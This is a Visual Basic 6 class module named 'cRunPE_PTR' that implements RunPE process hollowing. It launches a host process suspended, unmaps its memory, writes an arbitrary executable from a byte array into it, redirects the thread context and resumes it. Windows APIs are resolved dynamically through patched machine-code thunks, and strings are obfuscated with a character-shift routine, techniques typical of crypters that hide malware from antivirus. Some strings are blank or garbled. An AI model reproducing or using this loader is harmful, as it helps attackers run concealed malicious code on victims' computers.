VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Class1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Module    : cRunPE_PTR
' Author    : Karcrack
' Now$      : 28/08/2009  20:47
' Used for? : Run PE from ByteArray
' Thanks.   : Cobein/Slayer/Squeezer
'---------------------------------------------------------------------------------------

Option Explicit

Private Const IMAGE_DOS_SIGNATURE       As Long = &H5A4D&
Private Const IMAGE_NT_SIGNATURE        As Long = &H4550&

Private Const SIZE_DOS_HEADER           As Long = &H40
Private Const SIZE_NT_HEADERS           As Long = &HF8
Private Const SIZE_EXPORT_DIRECTORY     As Long = &H28
Private Const SIZE_IMAGE_SECTION_HEADER As Long = &H28



Dim THUNK_APICALL                   As String
Dim THUNK_KERNELBASE                As String

Dim PATCH1                          As String
Dim PATCH2                          As String

Private Const CONTEXT_FULL              As Long = &H10007
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

Private Type STARTUPINFO
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type CONTEXT
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As FLOATING_SAVE_AREA
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress              As Long
    Size                        As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature                   As Long
    FileHeader                  As IMAGE_FILE_HEADER
    OptionalHeader              As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_EXPORT_DIRECTORY
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type IMAGE_SECTION_HEADER
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

Private Type tAPICall
    ptsLIB              As Long ' Pointer to ANSI String that contains Library
    ptsProc             As Long ' Pointer to ANSI String that contains Procedure
    lReserved           As Long ' Just reserved...
    lPointer            As Long ' Pointer to the buffer that will contain temp variables from DllFunctionCall
    lpBuffer(3)         As Long ' Buffer that will contain temp variables
End Type

'MSVBVM60
Private Declare Function DllFunctionCall Lib "MSVBVM60" (ByRef typeAPI As tAPICall) As Long
Private Declare Sub CopyBytes Lib "MSVBVM60.DLL" Alias "__vbaCopyBytes" (ByVal Size As Long, Dest As Any, Source As Any)

Private c_lVTE          As Long
Private c_lOldVTE       As Long
Private c_bvASM(&HFF)   As Byte
       
Public Function zDoNotCall() As Long
    'This function will be replaced with machine code laterz
    'Do not add any public procedure on top of it
End Function

Public Function RunPE(ByRef bvBuff() As Byte, Optional sHost As String, Optional ByRef hProc As Long) As Boolean
    Dim i                       As Long
    Dim tIMAGE_DOS_HEADER       As IMAGE_DOS_HEADER
    Dim tIMAGE_NT_HEADERS       As IMAGE_NT_HEADERS
    Dim tIMAGE_SECTION_HEADER   As IMAGE_SECTION_HEADER
    Dim tSTARTUPINFO            As STARTUPINFO
    Dim tPROCESS_INFORMATION    As PROCESS_INFORMATION
    Dim tCONTEXT                As CONTEXT
    Dim sKernel As String
    Dim sNTDLL As String
    
    'KERNEL32
    sKernel = ""
    'NTDLL
    sNTDLL = ""


    Call CopyBytes(SIZE_DOS_HEADER, tIMAGE_DOS_HEADER, bvBuff(0))
   
    If Not tIMAGE_DOS_HEADER.e_magic = IMAGE_DOS_SIGNATURE Then Exit Function

    Call CopyBytes(SIZE_NT_HEADERS, tIMAGE_NT_HEADERS, bvBuff(tIMAGE_DOS_HEADER.e_lfanew))
   
    If Not tIMAGE_NT_HEADERS.Signature = IMAGE_NT_SIGNATURE Then Exit Function
                                                                                                 
    If sHost = vbNullString Then
        sHost = Space(260)
        'GetModuleFileNameW
        Invoke sKernel, "GetModuleFileNameW", App.hInstance, StrPtr(sHost), 260
    End If
   
    With tIMAGE_NT_HEADERS.OptionalHeader
       
        tSTARTUPINFO.cb = Len(tSTARTUPINFO)
        'CreateProcessW
        Invoke sKernel, "CreateProcessW", 0, StrPtr(sHost), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(tSTARTUPINFO), VarPtr(tPROCESS_INFORMATION)
        'NtUnmapViewOfSection
        Invoke sNTDLL, "NtUnmapViewOfSection", tPROCESS_INFORMATION.hProcess, .ImageBase
       'VirtualAllocEx
        Invoke sKernel, "VirtualAllocEx", tPROCESS_INFORMATION.hProcess, .ImageBase, .SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
       'NtWriteVirtualMemory
        Invoke sNTDLL, "NtWriteVirtualMemory", tPROCESS_INFORMATION.hProcess, .ImageBase, VarPtr(bvBuff(0)), .SizeOfHeaders, 0
   
        For i = 0 To tIMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1
            CopyBytes Len(tIMAGE_SECTION_HEADER), tIMAGE_SECTION_HEADER, bvBuff(tIMAGE_DOS_HEADER.e_lfanew + SIZE_NT_HEADERS + SIZE_IMAGE_SECTION_HEADER * i)
            'NtWriteVirtualMemory
            Invoke sNTDLL, "NtWriteVirtualMemory", tPROCESS_INFORMATION.hProcess, .ImageBase + tIMAGE_SECTION_HEADER.VirtualAddress, VarPtr(bvBuff(tIMAGE_SECTION_HEADER.PointerToRawData)), tIMAGE_SECTION_HEADER.SizeOfRawData, 0
        Next i

        tCONTEXT.ContextFlags = CONTEXT_FULL
       'NtGetContextThread
        Invoke sNTDLL, "NtGetContextThread", tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
        'NtWriteVirtualMemory
        Invoke sNTDLL, "NtWriteVirtualMemory", tPROCESS_INFORMATION.hProcess, tCONTEXT.Ebx + 8, VarPtr(.ImageBase), 4, 0
       
        tCONTEXT.Eax = .ImageBase + .AddressOfEntryPoint
        'NtSetContextThread
        Invoke sNTDLL, "NtSetContextThread", tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
        'NtResumeThread
        Invoke sNTDLL, "NtResumeThread", tPROCESS_INFORMATION.hThread, 0
       
        hProc = tPROCESS_INFORMATION.hProcess
    End With
   
    RunPE = True
End Function

Public Function Invoke(ByVal sLib As String, ByVal sFunc As String, ParamArray Params()) As Long
    Dim lPtr        As Long
    Dim i           As Long
    Dim sData       As String
    Dim sParams     As String
    Dim lMod        As Long
   
    lMod = GetAPIPtr(sLib, sFunc)
   
    If lMod = 0 Then Exit Function
   
    For i = UBound(Params) To 0 Step -1
        sParams = sParams & "68" & GetLong(CLng(Params(i)))
    Next
   
    lPtr = VarPtr(c_bvASM(0))
    lPtr = lPtr + (UBound(Params) + 2) * 5
    lPtr = lMod - lPtr - 5
   
    sData = THUNK_APICALL
    sData = Replace(sData, PATCH1, sParams)
    sData = Replace(sData, PATCH2, GetLong(lPtr))
   
    Call PutThunk(sData)
   
    Invoke = PatchCall
End Function

Private Function GetAPIPtr(ByVal sLib As String, ByVal sProc As String) As Long
    On Error Resume Next
    Dim tAPI            As tAPICall
    Dim bvLib()         As Byte
    Dim bvMod()         As Byte
   
    Call Unicode2ANSI(sLib, bvLib)
    Call Unicode2ANSI(sProc, bvMod)
   
    With tAPI
        .ptsLIB = VarPtr(bvLib(0))
        .ptsProc = VarPtr(bvMod(0))
        .lReserved = &H40000
        .lPointer = VarPtr(.lpBuffer(0))
    End With
   
    GetAPIPtr = DllFunctionCall(tAPI)
End Function

'COBEIN (=
Private Sub Unicode2ANSI(ByVal sUNICODE As String, ByRef bvANSI() As Byte)
    Dim i           As Long
   
    ReDim bvANSI(Len(sUNICODE))
    For i = 1 To Len(sUNICODE)
        bvANSI(i - 1) = Asc(Mid$(sUNICODE, i, 1))
    Next i
End Sub


Private Function GetLong(ByVal lData As Long) As String
    Dim bvTemp(3)   As Byte
    Dim i           As Long
   
    CopyBytes &H4, bvTemp(0), lData
    For i = 0 To 3
        GetLong = GetLong & Right("0" & Hex(bvTemp(i)), 2)
    Next
End Function

Private Sub PutThunk(ByVal sThunk As String)
    Dim i   As Long
    For i = 0 To Len(sThunk) - 1 Step 2
        c_bvASM((i / 2)) = CByte("&h" & Mid$(sThunk, i + 1, 2))
    Next i
End Sub

Private Function PatchCall() As Long
    CopyBytes &H4, c_lVTE, ByVal ObjPtr(Me)
    c_lVTE = c_lVTE + &H1C
    CopyBytes &H4, c_lOldVTE, ByVal c_lVTE
    CopyBytes &H4, ByVal c_lVTE, VarPtr(c_bvASM(0))
    PatchCall = zDoNotCall
    CopyBytes &H4, ByVal c_lVTE, c_lOldVTE
End Function

Private Sub Class_Initialize()
    '8B4C240851<PATCH1>E8<PATCH2>5989016631C0C3
    THUNK_APICALL = ""
    '8B5C240854B830000000648B008B400C8B401C8B008B400889035C31C0C3
    THUNK_KERNELBASE = "г╫й╪мкогйк╫глоооооооикг╫оог╫коо╪г╫кон╪г╫оог╫кооггфолй╪лн╪о╪л"
    '<PATCH1>
    PATCH1 = ""
    '<PATCH2>
    PATCH2 = ""
End Sub

Public Function rot(x As String) As String
        Dim i            As Long
     
        For i = 1 To Len(x)
                Mid$(x, i, 1) = Chr$(Asc(Mid$(x, i, 1)) + 6)
        Next i
        rot = x
End Function

